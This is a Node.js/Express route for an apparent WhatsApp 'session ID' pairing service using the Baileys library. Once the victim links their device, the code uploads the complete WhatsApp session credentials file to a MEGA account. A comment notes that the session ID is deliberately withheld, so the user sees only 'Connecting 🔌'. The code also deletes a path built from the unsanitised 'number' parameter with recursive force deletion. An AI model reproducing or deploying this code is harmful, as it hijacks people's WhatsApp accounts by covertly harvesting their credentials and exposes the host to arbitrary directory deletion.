import express from "express";
import fs from "fs";
import pino from "pino";

import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import { upload } from "./mega.js";

const router = express.Router();

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
    } catch (e) {
        console.error("Error removing file:", e);
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

router.get("/", async (req, res) => {
    let num = req.query.number;
    let dirs = "./" + (num || `session`);

    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, "");

    const phone = pn("+" + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({
                code: "Invalid phone number.",
            });
        }
        return;
    }
    num = phone.getNumber("e164").replace("+", "");

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" }),
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === "open") {
                    console.log("✅ Connected successfully!");
                    
                    try {
                        const credsPath = dirs + "/creds.json";
                        const megaUrl = await upload(
                            credsPath,
                            `creds_${num}_${Date.now()}.json`,
                        );
                        const megaFileIdRaw = getMegaFileId(megaUrl);
                        const megaFileId = "ᴏꜱʜɪʏᴀ~" + megaFileIdRaw;

                        if (megaFileId) {
                            console.log("✅ Session uploaded to MEGA. ID:", megaFileId);

                            const userJid = jidNormalizedUser(num + "@s.whatsapp.net");

                            // බොත්තම් සහ Session ID එක යැවීම වෙනුවට සරල text එකක් පමණක් යවයි
                            await KnightBot.sendMessage(userJid, { 
                                text: "Connecting 🔌" 
                            });

                            console.log("📄 Simple message sent to WhatsApp");
                        }

                        console.log("🧹 Cleaning up...");
                        await delay(1000);
                        removeFile(dirs);
                        await delay(2000);
                        process.exit(0);
                    } catch (error) {
                        console.error("❌ Error:", error);
                        removeFile(dirs);
                        process.exit(1);
                    }
                }

                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode !== 401) {
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, "");
                if (num.startsWith("+")) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    if (!res.headersSent) {
                        res.send({ code });
                    }
                } catch (error) {
                    if (!res.headersSent) {
                        res.status(503).send({ code: "Error fetching pairing code" });
                    }
                }
            }

            KnightBot.ev.on("creds.update", saveCreds);
        } catch (err) {
            console.error("Initialization error:", err);
            if (!res.headersSent) {
                res.status(503).send({ code: "Service Unavailable" });
            }
        }
    }

    await initiateSession();
});

export default router;
